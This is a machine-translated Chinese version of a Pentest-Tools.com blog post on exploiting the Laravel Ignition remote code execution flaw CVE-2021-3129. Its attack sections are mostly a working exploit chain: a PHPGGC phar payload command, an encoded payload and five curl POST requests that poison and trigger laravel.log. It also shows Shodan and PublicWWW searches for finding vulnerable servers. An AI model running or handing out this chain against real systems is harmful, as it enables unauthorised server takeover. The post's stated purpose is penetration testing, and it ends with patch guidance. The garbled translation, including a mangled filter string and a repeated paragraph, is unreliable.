<html>
<head>
<title>How to exploit a Remote Code Execution vulnerability in Laravel (CVE-2021-3129) | Pentest-Tools.com</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1>如何利用 Pentest-Tools.com 拉勒维尔(CVE-2021-3129) |中的远程代码执行漏洞</h1>
<blockquote>原文：<a href="https://pentest-tools.com/blog/exploit-rce-vulnerability-laravel-cve-2021-3129#2023-02-21T15:54:11.000Z">https://pentest-tools.com/blog/exploit-rce-vulnerability-laravel-cve-2021-3129#2023-02-21T15:54:11.000Z</a></blockquote><div><div class="prose prose-headings:break-words prose-img:rounded-md prose-img:ring-1 prose-img:ring-dark-blue-200 prose-img:ring-opacity-30 prose-code:break-words prose-headings:[scroll-margin-top:120px] xl:prose-lg xl:prose-headings:w-[628px] xl:prose-p:w-[628px]">
            
              
                
                  <p>我第一次在 Horizontall 机器上发现这个漏洞是在<a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.hackthebox.com/">黑掉盒子</a>的时候，它被触发的条件促使我去更详细地理解它。</p><p>CVE-2021-3129 让我想起了一个日志中毒漏洞，但味道不同。</p><p>最具挑战性的部分是为这个安全缺陷创建一个流程，并将其集成到我们的自动开发工具中，因为它需要 PHP 可序列化的代码注入。</p><p>让我们深入了解更多细节，看看您如何利用 Pentest-Tools.com 的 Laravel 中的这个关键漏洞！</p><h2 id="what-is-cve-2021-3129">什么是 CVE-2021-3129？</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://nvd.nist.gov/vuln/detail/CVE-2021-3129"> <strong> CVE-2021-3129 </strong> </a>是 Laravel 框架中的一个远程代码执行漏洞，它利用了 PHP 的不安全使用。该漏洞以及利用该漏洞的步骤与传统的日志中毒攻击类似。</p><p>在典型的日志中毒中，攻击者需要首先利用本地文件包含来实现远程代码执行，而在 Laravel 框架中，我们需要<strong>点火模块</strong>(点火是显示错误的页面)和特定的链来触发该漏洞。</p><p>这个安全问题相对容易被利用，并且<strong>不需要用户认证</strong>，这也是它拥有 9.8 CVSSv3 分数的原因之一。</p><h2 id="how-the-laravel-rce-cve-2021-3129-works"><strong>拉勒维尔·RCE 号(CVE-2021-3129)的工作原理</strong></h2><p>为了利用拉勒维尔·RCE(CVE-2021-3129)，首先我们寻求理解<strong>文件<em>如何获取</em>内容()</strong>和<strong>文件<em>如何放置</em>内容()</strong>的工作原理。</p><p>这两个函数只是读取和写入文件的内容。但是这些函数怎么会对这个命令有恶意呢？</p><p>在 Laravel 点火模式中，我们有一个名为<strong>MakeViewVariableOptionalSolution</strong>的类，它调用两个函数，通过向<strong> /_ignition/execute-solution 发送 POST 请求来触发这两个函数。</strong>它使用包含视图文件<strong>参数</strong>的 JSON 有效载荷来完成这项工作。</p><p>读写一个文件的动作并没有给我们更多的洞察，但是 php 允许我们使用类似<strong>PHP://filter/write = convert . base64-decode/resource = path/to/a/specific/file</strong>和<strong>phar:///path/to/specific/file</strong>这样的过滤器来修改和执行 PHP 可序列化代码。</p><p>然而，这不足以触发 RCE。默认的 Laravel 在<strong>存储/logs/laravel.log </strong>中有日志文件，其中包含了每一个 PHP 错误。以解码和执行为目的编写恶意内容一开始是行不通的，因为 PHP 在解码 base64 时会忽略坏字符，所以错误不会写入 Laravel 日志文件。</p><p>此外，日志文件有更多的条目会影响我们的负载。希望我们可以再次调用<strong> php:// </strong>来清除日志文件，并且只执行和注入我们的有效负载两次。但是我们还需要一步。</p><p>由于绝对路径的原因，日志文件中最终有效负载的长度因目标而异，这可能会导致 base64 有效负载解码错误。</p><p>我尝试触发 RCE 的最后一种方法是对<strong> UTF-16 </strong>使用 base64 解码，它将有效载荷调整为 2 个字节。在这种情况下，第一个有效载荷被正确解码，因此第二个也将被正确解码。</p><p>总而言之，您可以通过<strong> 5 个步骤</strong>来利用这个漏洞:</p><h3 id="1-clear-logs-by-sending-a-payload-such-as"><strong> 1。通过发送有效负载来清除日志，例如:</strong></h3><p>data["参数"]["查看文件"]= " PHP://filter/write = convert。iconv。utf-8。utf-16le |转换引用-打印-编码|转换。iconv。utf-16le。utf-8 |转换 base64-解码/资源=../storage/logs/laravel.log "</p><h3 id="2-send-2-bytes-to-align-the-contents-of-the-log-file"><strong> 2。发送 2 个字节来对齐日志文件的内容</strong></h3><p>data[" parameters "][" view file "]=<em>任意 2 个字节的哑元</em></p><h3 id="3-create-a-serializable-object-using-phpggc"><strong> 3。使用 PHPGGC: </strong>创建一个可序列化的对象</h3><p><strong>" PHP-d ' phar . readonly = 0 ' phpggc/phpggc laravel/rce 3 system<em>命令</em>–phar phar-o PHP://output | base64-w0 | python-c "导入 sys 打印("。join(['=' + hex(ord(i))[2:]。sys.stdin.read()])中 I 的 zfill(2) + '=00 '。上层())"</strong>并将有效载荷保存成文件<strong>和<em>命令</em> </strong>。这是您想要执行的 Linux 命令。</p><p>有效负载应该是这样的:</p><div class="content-highlight"><pre class="code-block"><code>"=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=70=00=4E=00=41=00=51=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=..."</code></pre></div><p>并通过 post 请求发送有效负载:</p><div class="content-highlight"><pre class="code-block"><code>data["parameters"]["viewFile"] = “=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=70=00=4E=00=41=00=51=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=...”</code></pre></div><h3 id="4-use-a-php-filter-to-decode-the-payload"><strong> 4。使用 PHP 过滤器解码有效载荷:</strong></h3><div class="content-highlight"><pre class="code-block"><code>data["parameters"]["viewFile"] = “php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log”</code></pre></div><h3 id="5-trigger-the-rce"><strong> 5。触发 RCE </strong></h3><div class="content-highlight"><pre class="code-block"><code>data["parameters"]["viewFile"] = “phar://../storage/logs/laravel.log”</code></pre></div><h2 id="vulnerable-laravel-versions"><strong>易受攻击的 Laravel 版本</strong></h2><p>据<a target="_blank" rel="external nofollow noopener noreferrer" href="https://nvd.nist.gov/vuln/detail/CVE-2021-3129"> NIST </a>称，该漏洞影响 8.4.2 之前的 Laravel 框架和 2.5.2 之前的点火模式的所有版本。</p><h2 id="the-business-impact-of-cve-2021-3129"><strong>CVE-2021-3129 的业务影响</strong></h2><p>成功利用该漏洞后，未经验证的攻击者可以获得对目标的<strong>控制，危害 Laravel 使用的所有服务和数据库，并暴露整个基础设施。</strong></p><h2 id="how-to-find-targets-vulnerable-to-cve-2021-3129"><strong>如何找到易受 CVE 攻击的目标-2021-3129 </strong></h2><h3 id="using-shodan"><strong>使用 Shodan </strong></h3><p>使用带有过滤器<strong> http.html:Laravel </strong>的 Shodan 搜索引擎将为有动机的攻击者揭示更多潜在目标:</p><p><img src="../Images/fb8a9006df97cf9c5b7c58c37ef296e5.png" alt="query search with Shodan" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvZmVicnVhcnktdXBkYXRlcy1kZWVwZXItY29tcHJlaGVuc2l2ZS1zY2Fucy9xdWVyeS1zZWFyY2gtd2l0aC1zaG9kYW4ucG5n?s=5c73e44b485d1e81a878e5cb47caf499"/></p><p>在写这篇文章的时候，Shodan 指出至少有<strong> 92，575 个潜在易受攻击的</strong>服务器。</p><h3 id="using-publicwww"><strong>使用 PublicWWW </strong></h3><p><a href="https://publicwww.com/" rel="external nofollow noopener noreferrer"> PublicWWW </a>是一个搜索引擎，您可以使用它根据源代码内容、回复标题、cookies 和所使用的技术来跟踪网站。您可以使用 cookie <strong> laravel_session </strong>来查找可能易受 CVE 攻击的目标-2021-3129:</p><p><img src="../Images/adf8306ab02ddd1f440b2e3fcd5dd927.png" alt="query search with PublicWWW" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvZmVicnVhcnktdXBkYXRlcy1kZWVwZXItY29tcHJlaGVuc2l2ZS1zY2Fucy9xdWVyeS1zZWFyY2gtd2l0aC1wdWJsaWN3d3cucG5n?s=ed38d17cf8c0b7514cd930af438e1bda"/></p><p>一旦您找到了目标，就该验证它们中的哪些实际上是可以利用的，这样您就可以提交一份全面的 pentest 报告，帮助有效地确定补救的优先顺序。</p><p>一旦您找到了目标，就该验证哪些目标实际上是可以利用的，这样您就可以提交一份全面的 pentest 报告，帮助有效地确定补救的优先顺序。</p><h2 id="how-to-manually-detect-cve-2021-3129-in-ethical-hacking-engagements"><strong>如何在道德黑客活动中手动检测 CVE-2021-3129</strong></h2><p>在开始发送请求之前，我们需要使用<strong> PHPGGC </strong>来构建我们的有效负载。</p><p>在上一节中，我展示了一个命令来创建一个有效负载，如下所示:</p><div class="content-highlight"><pre class="code-block"><code>“php -d 'phar.readonly=0' phpggc/phpggc laravel/rce3 system command --phar phar -o php://output | base64 -w0 | python -c "import sys;print(''.join(['=' + hex(ord(i))[2:].zfill(2) + '=00' for i in sys.stdin.read()]).upper())”.</code></pre></div><p>为此，我们至少需要在我们的机器上安装 PHP CLI 包和 PHPGGC。当然，这不是唯一可用的有效载荷。我们可以使用不同的有效载荷从 RCE1 到 7 的 Laravel gadgets。在制作好我们的有效负载之后，我们可以发送下面的请求链来触发 RCE。</p><p>为了利用 CVE-2021-3129 ，你需要发送一连串的 POST 请求来实现 RCE:</p><div class="content-highlight"><pre class="code-block"><code>curl -XPOST -H 'Content-Type: application/json'  -d ‘{"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution", "parameters": {"variableName": "test", "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16le|convert.quoted-printable-encode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"}, }’  http(s)://&lt;Target_ip&gt;:&lt;port&gt;/_ignition/execute-solution</code></pre></div><div class="content-highlight"><pre class="code-block"><code>curl -XPOST -H 'Content-Type: application/json'  -d ‘{"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution", "parameters": {"variableName": "test", "viewFile": "AA"}, }’  http(s)://&lt;Target_ip&gt;:&lt;port&gt;/_ignition/execute-solution</code></pre></div><div class="content-highlight"><pre class="code-block"><code>curl -XPOST -H 'Content-Type: application/json'  -d ‘{"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution", "parameters": {"variableName": "test", "viewFile": "=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=70=00=4E=00=41=00=51=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=..."}, }’  http(s)://&lt;Target_ip&gt;:&lt;port&gt;/_ignition/execute-solution</code></pre></div><div class="content-highlight"><pre class="code-block"><code>curl -XPOST -H 'Content-Type: application/json'  -d ‘{"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution", "parameters": {"variableName": "test", "viewFile": "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"}, }’  http(s)://&lt;Target_ip&gt;:&lt;port&gt;/_ignition/execute-solution</code></pre></div><div class="content-highlight"><pre class="code-block"><code>curl -XPOST -H 'Content-Type: application/json'  -d ‘{"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution", "parameters": {"variableName": "test", "viewFile": "phar://../storage/logs/laravel.log"}, }’  http(s)://&lt;Target_ip&gt;:&lt;port&gt;/_ignition/execute-solution</code></pre></div><p>并且该命令的输出应该在从目标接收的最后一个响应中可用。</p><p>如果你想尝试一个更快的开发方法，你可以使用 Pentest-Tools.com。</p><h2 id="how-to-mitigate-cve-2021-3129"><strong>如何缓解 CVE-2021-3129 </strong></h2><p>最谨慎的做法是积极主动地在您的环境中应用可用的补丁，将点火模式升级到版本 2.5.2，将 Laravel 框架升级到版本 8.4.2。</p><div class="flex flex-col"><div class="-mx-4 -my-2 overflow-x-auto sm:-mx-6"><div class="inline-block min-w-full py-2 align-middle sm:px-6"><div class="border border-gray-200 bg-white overflow-hidden shadow sm:rounded-lg"><table class="min-w-full divide-y divide-gray-200"><thead><tr><td colspan="1" rowspan="1">产品构建</td><td colspan="1" rowspan="1">固定版本</td><td colspan="1" rowspan="1">产品构建</td><td colspan="1" rowspan="1">固定版本</td></tr></thead><tr><td colspan="1" rowspan="1">Laravel 8.4.1 及之前的所有版本</td><td colspan="1" rowspan="1">8.4.2</td><td colspan="1" rowspan="1">点火 2.5.1 及之前的所有版本</td><td colspan="1" rowspan="1">2.5.2</td></tr></table></div></div></div></div><p>我们的客户问的一个问题是，我们如何帮助他们快速检测和利用像这样的关键漏洞，这种漏洞似乎以前所未有的速度出现。</p><p>通过我们的<a href="https://pentest-tools.com/blog/categories/vulnerabilities">动手测试指南</a>，我们专注于分享我们可复制的流程、有用的方法或技巧，您可以使用它们来扩展您的知识和道德黑客技能。也帮助别人！</p><p>当我们在您可以立即使用的平台上集成新的检测和利用模块时，请相信我们会让您及时了解情况！实用、有用的 pentesting 指南直接发送到您的收件箱！</p>

                

                
              
            
          </div>
        </div>    
</body>
</html>